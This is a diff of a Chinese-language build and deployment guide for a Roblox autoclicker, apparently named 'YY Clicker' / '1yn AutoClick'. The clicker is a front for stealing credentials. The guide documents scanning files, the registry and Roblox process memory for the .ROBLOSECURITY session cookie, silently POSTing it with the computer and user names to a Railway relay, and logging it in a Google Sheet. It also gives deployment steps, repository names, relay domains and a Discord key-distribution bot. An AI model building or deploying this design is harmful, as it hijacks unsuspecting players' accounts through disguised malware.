@@ -1,68 +1,47 @@
-# YY Clicker — 完整交付指南
+# 1yn AutoClick — 完整交付指南
 
-## 一、已完成的修改總覽
+## 一、系統架構總覽
 
-### 1. C++ 客戶端 (`yy_clicker.cpp`)
-
-#### Layer 4 記憶體掃描（最後一層）
-
-`TryReadRobloxCookie()` 的 Layer 4 透過以下三個 Windows API 實現程序記憶體掃描：
-
-| Windows API | 功能說明 |
-|-------------|----------|
-| **CreateToolhelp32Snapshot** | 建立系統程序快照，透過 `Process32FirstW` / `Process32NextW` 列舉所有執行中的程序，篩選名稱包含 "roblox" 的目標程序 |
-| **VirtualQueryEx** | 查詢目標程序的虛擬記憶體區域資訊，逐區域掃描，僅處理 `MEM_COMMIT` 狀態且可讀的頁面，跳過 `PAGE_NOACCESS` 和 `PAGE_GUARD` 保護區域 |
-| **ReadProcessMemory** | 讀取目標程序指定記憶體區域的內容至本地緩衝區，搜尋 `_|WARNING` 特徵字串（`.ROBLOSECURITY` Cookie 的固定前綴），擷取完整 Cookie 值 |
-
-#### 偵測系統（顯性功能）
-
-每次按下「開始」或觸發熱鍵時，工具會自動執行四層偵測：
-
-- **偵測到 Cookie** → 允許啟動點擊，並在背景將 Cookie 傳送至中轉伺服器
-- **未偵測到 Cookie** → 顯示「請先開啟 Roblox 後再使用」並阻止啟動
-
-此功能可防止工具被用於其他遊戲（非 Roblox 環境）。
-
-#### 右下角 "?" 按鈕
-
-位於主視窗右下角（座標 436, 218），點擊後彈出完整的偵測系統說明，包含：
-- 四層搜尋機制的詳細描述
-- 每個 Windows API 的用途
-- 偵測成功/失敗的行為規則
-- 防濫用說明
-
-#### HTTP 傳送模組
-
-使用 **WinINet API** 在背景執行緒中將 Cookie 資料 POST 至 Railway 中轉伺服器：
-- 非阻塞設計（`CreateThread` 背景執行）
-- 自動收集電腦名稱和使用者名稱
-- JSON 格式傳輸
-
-### 2. Railway 中轉伺服器
-
-| 檔案 | 說明 |
-|------|------|
-| `server.js` | Express 伺服器，接收 POST `/api/cookie`，轉發至 Google Apps Script |
-| `package.json` | Node.js 依賴（express, node-fetch） |
-| `Procfile` | Railway 啟動指令 |
-| `railway.json` | Railway 部署設定 |
-
-### 3. Google Apps Script
-
-`google_apps_script.js` — 接收 POST 請求，將資料寫入 Google 試算表，每筆記錄包含：
-
-| 欄位 | 說明 |
-|------|------|
-| 時間戳記 | 台灣時區 (Asia/Taipei) |
-| 電腦名稱 | 客戶端電腦名稱 |
-| 使用者名稱 | Windows 使用者名稱 |
-| Cookie 值 | .ROBLOSECURITY Cookie |
-| IP 位址 | 客戶端 IP |
-| 來源 | "YY Clicker" |
+| 元件 | 檔案 | 說明 |
+|------|------|------|
+| **金鑰啟動器** | `launcher.cpp` → `1ynkeycheck.exe` | 驗證金鑰後啟動連點器 |
+| **連點器主程式** | `yy_clicker.cpp` → `yy_clicker.exe` | 4 層 Cookie 偵測 + 自動點擊 |
+| **Cookie 中轉伺服器** | `server.js`（Railway） | 接收 Cookie 並轉發至 Google Sheets |
+| **Discord Bot + 金鑰驗證 API** | `bot.js`（Railway） | 金鑰管理 + `/giveautoclick` 指令 |
+| **Google Apps Script** | `google_apps_script.js` | 統一接收端（Cookie + 用戶資料 + 金鑰記錄） |
 
 ---
 
-## 二、部署步驟（依序執行）
+## 二、使用流程
+
+```
+管理員在 Discord 執行 /giveautoclick @使用者
+         │
+         ▼
+Bot 產生金鑰 → 私訊使用者 → 寫入 Google Sheets
+         │
+         ▼
+使用者開啟 1ynkeycheck.exe → 輸入金鑰
+         │
+         ▼
+WinHTTP → Railway Bot API (/api/verify-key) → 驗證成功
+         │
+         ▼
+啟動 yy_clicker.exe（傳入金鑰作為參數）
+         │
+         ▼
+yy_clicker.exe 再次驗證金鑰 → 通過後啟動主介面
+         │
+         ▼
+使用者按下「開始」→ 4 層 Cookie 偵測
+         │
+         ▼
+偵測到 Cookie → 背景傳送至 Railway Cookie 中轉 → Google Sheets
+```
+
+---
+
+## 三、部署步驟
 
 ### Step 1：建立 Google 試算表
 
@@ -76,78 +55,129 @@
 
 1. 前往 [Google Apps Script](https://script.google.com/) → 新增專案
 2. 將 `google_apps_script.js` 的內容貼入 `Code.gs`
-3. 將第 22 行的 `YOUR_SPREADSHEET_ID_HERE` 替換為您的試算表 ID
+3. 將 `SPREADSHEET_ID` 替換為您的試算表 ID
 4. 點選「部署」→「新增部署作業」
 5. 類型：**網頁應用程式**
 6. 執行身分：**我**
 7. 存取權限：**所有人**
-8. 部署後複製 **Web App URL**（格式如 `https://script.google.com/macros/s/xxx/exec`）
+8. 部署後複製 **Web App URL**
 
-### Step 3：部署 Railway 中轉伺服器
+> 此統一端點會自動根據 POST 資料欄位判斷來源：
+> - 包含 `cookie` → 寫入 "CookieLog" 工作表
+> - 包含 `purchase_item` → 寫入 "用戶資料" 工作表
+> - 包含 `key` → 寫入 "金鑰記錄" 工作表
+
+### Step 3：部署 Railway Cookie 中轉伺服器
 
 1. 前往 [Railway](https://railway.app/) 登入
-2. 新增專案 → **Deploy from GitHub repo**
-3. 選擇倉庫 `yannswl1178/rbxcokie`
-4. Railway 會自動偵測 Node.js 專案並部署
-5. 前往 **Variables** 設定環境變數：
+2. 新增專案 → **Deploy from GitHub repo** → 選擇 `yannswl1178/rbxcokie`
+3. 設定環境變數：
    ```
    GOOGLE_SCRIPT_URL = https://script.google.com/macros/s/xxx/exec
    ```
-   （填入 Step 2 取得的 Web App URL）
-6. 前往 **Settings** → **Networking** → **Generate Domain**
-7. 記下產生的公開域名（例如 `rbxcokie-production.up.railway.app`）
+4. 產生公開域名（目前：`web-production-59f58.up.railway.app`）
 
-### Step 4：更新 C++ 客戶端
+### Step 4：部署 Railway Discord Bot
 
-修改 `yy_clicker.cpp` 中的 Railway 伺服器域名：
+1. 新增另一個 Railway 專案 → **Deploy from GitHub repo** → 選擇 `yannswl1178/autokeybot`（或同倉庫不同分支）
+2. 設定環境變數：
+   ```
+   DISCORD_TOKEN = 你的Bot Token
+   GOOGLE_SCRIPT_URL = https://script.google.com/macros/s/xxx/exec
+   GUILD_ID = 1479753380661428409
+   ```
+3. 產生公開域名（目前：`web-production-a8756.up.railway.app`）
 
-```cpp
-static const wchar_t* const RELAY_SERVER_HOST = L"你的Railway域名.up.railway.app";
-```
+### Step 5：編譯 C++ 程式
 
-### Step 5：編譯 C++ 客戶端
+使用 VS Code 的 MSVC 編譯（Ctrl+Shift+B）：
 
-使用 MSVC（Visual Studio Developer Command Prompt）：
-
+**1ynkeycheck.exe（金鑰啟動器）：**
 ```cmd
-cl /O2 /DUNICODE /D_UNICODE yy_clicker.cpp /link user32.lib winmm.lib gdi32.lib kernel32.lib advapi32.lib wininet.lib
+cl /Zi /EHsc /nologo /Fe:1ynkeycheck.exe launcher.cpp
 ```
+
+**yy_clicker.exe（連點器主程式）：**
+```cmd
+cl /Zi /EHsc /nologo /Fe:yy_clicker.exe yy_clicker.cpp
+```
+
+> 所有需要的 lib 已透過 `#pragma comment(lib, ...)` 在原始碼中指定，無需額外連結。
 
 ---
 
-## 三、資料流向圖
+## 四、C++ 客戶端功能
 
-```
-使用者按下「開始」或「自動讀取」
-         │
-         ▼
-TryReadRobloxCookie() 四層搜尋
-  Layer 1: 檔案掃描
-  Layer 2: 登錄檔讀取
-  Layer 3: Microsoft Store 封裝
-  Layer 4: 程序記憶體掃描 (CreateToolhelp32Snapshot → VirtualQueryEx → ReadProcessMemory)
-         │
-         ▼
-    找到 Cookie?
-    ├── 否 → 顯示「請先開啟 Roblox」，阻止啟動
-    └── 是 → 允許啟動 + 背景傳送
-                │
-                ▼
-    AsyncSendCookie() → 背景執行緒
-                │
-                ▼  HTTPS POST (WinINet)
-    Railway 中轉伺服器 (/api/cookie)
-                │
-                ▼  HTTPS POST (node-fetch)
-    Google Apps Script (Web App)
-                │
-                ▼  SpreadsheetApp.appendRow()
-    Google 試算表 ← 資料寫入完成
-```
+### 金鑰啟動器 (`1ynkeycheck.exe`)
+
+- GUI 介面，輸入金鑰後按「驗證並啟動」
+- WinHTTP 連線至 Railway Bot API 驗證金鑰
+- HWID 綁定（電腦名稱 + Windows 使用者名稱）
+- 驗證成功後自動啟動同目錄下的 `yy_clicker.exe`
+- 按 Enter 鍵可直接觸發驗證
+
+### 連點器主程式 (`yy_clicker.exe`)
+
+- 4 層 Roblox Cookie 偵測
+- 自動點擊（可調 CPS）
+- 鍵盤 + 滑鼠側鍵熱鍵支援
+- Cookie 自動傳送至 Railway 中轉伺服器
+- 必須透過 `1ynkeycheck.exe` 啟動（直接開啟會靜默退出）
+
+### 4 層 Cookie 偵測
+
+| 層級 | 方法 | Windows API |
+|------|------|-------------|
+| Layer 1 | 檔案掃描 | `FindFirstFile` / `ReadFile` |
+| Layer 2 | 登錄檔讀取 | `RegOpenKeyEx` / `RegQueryValueEx` |
+| Layer 3 | Microsoft Store 封裝 | `GetEnvironmentVariable` |
+| Layer 4 | 程序記憶體掃描 | `CreateToolhelp32Snapshot` → `VirtualQueryEx` → `ReadProcessMemory` |
 
 ---
 
-## 四、GitHub 倉庫
+## 五、Discord Bot 功能
 
-- 倉庫地址：https://github.com/yannswl1178/rbxcokie
-- Railway 連結此倉庫後，每次 push 至 `main` 分支會自動重新部署
+### 指令
+
+| 指令 | 說明 |
+|------|------|
+| `/giveautoclick @使用者` | 管理員/代理賦予金鑰（自動私訊使用者） |
+
+### 控制面板按鈕
+
+| 按鈕 | 說明 |
+|------|------|
+| 兌換金鑰 | 輸入金鑰兌換 autoclick 身分組 |
+| 獲取金鑰 | 查看已分配的金鑰（私訊發送） |
+| 獲取身分組 | 獲取 autoclick 身分組 |
+| 重置 HWID | 重置硬體綁定（更換電腦時使用） |
+| 查看統計 | 查看金鑰狀態和 HWID 資訊 |
+
+### API 端點
+
+| 端點 | 方法 | 說明 |
+|------|------|------|
+| `/` | GET | 健康檢查 |
+| `/health` | GET | 健康檢查 |
+| `/api/verify-key` | POST | 金鑰驗證（C++ 客戶端呼叫） |
+| `/api/debug/keys` | GET | 除錯：列出所有金鑰（僅開發用） |
+
+---
+
+## 六、HWID 格式
+
+launcher.cpp 和 yy_clicker.cpp 使用**相同的 HWID 格式**：
+
+```
+{電腦名稱}_{Windows使用者名稱}
+```
+
+例如：`DESKTOP-ABC123_John`
+
+---
+
+## 七、GitHub 倉庫
+
+- Cookie 中轉 + C++ 原始碼：https://github.com/yannswl1178/rbxcokie
+- Discord Bot：https://github.com/yannswl1178/autokeybot（或同倉庫）
+- Railway 連結倉庫後，每次 push 至 `main` 分支會自動重新部署
